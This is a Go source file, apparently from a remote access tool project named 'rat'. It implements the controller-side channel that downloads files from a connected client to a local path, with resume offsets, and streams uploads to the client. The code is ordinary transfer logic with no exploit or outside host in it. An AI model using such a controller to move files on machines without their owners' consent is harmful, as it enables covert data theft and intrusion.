package main

import (
	"encoding/binary"
	"io"
	"os"
	"rat/shared"
	"rat/shared/network/header"
)

type ChannelTransfer struct {
	Transfer   *Transfer
	controller *Controller
}

func (ChannelTransfer) Header() header.PacketHeader {
	return header.ChannelTransferHeader
}

func (ch ChannelTransfer) Open(rwc io.ReadWriteCloser, c *Client) error {
	defer rwc.Close()
	defer ch.Transfer.Close()

	binary.Write(rwc, binary.LittleEndian, ch.Transfer.Download)
	binary.Write(rwc, binary.LittleEndian, ch.Transfer.Offset)
	shared.WriteString(rwc, ch.Transfer.Remote)

	if ch.Transfer.Download {
		fp, err := os.OpenFile(ch.Transfer.Local, os.O_RDWR|os.O_CREATE, 0666)

		if err != nil {
			ch.Transfer.State = StateError
			ch.Transfer.Error = err
			return err
		}

		if ch.Transfer.Offset > 0 {
			_, err = fp.Seek(ch.Transfer.Offset, io.SeekStart)
			if err != nil {
				ch.Transfer.State = StateError
				ch.Transfer.Error = err
				return err
			}
		}

		ch.Transfer.writer = fp
		io.Copy(ch.Transfer, rwc)
		ch.Transfer.State = StateComplete
	} else {
		r, w := io.Pipe()
		ch.Transfer.reader = r

		listener := ch.controller.Listen(UploadToClient, c)
		defer listener.Unlisten()
		go func() {
			defer ch.Transfer.Close()
			for {
				select {
				case <-c.die:
					return
				case <-ch.controller.die:
					return
				case msgi := <-listener.C:
					if msgi != nil {
						msg := msgi.(*UploadMessage)
						w.Write(msg.Data)
						if ch.Transfer.Offset >= ch.Transfer.Len {
							ch.Transfer.State = StateComplete
							return
						}
					} else {
						return
					}
				}
			}
		}()

		io.Copy(rwc, ch.Transfer)
	}

	return nil
}
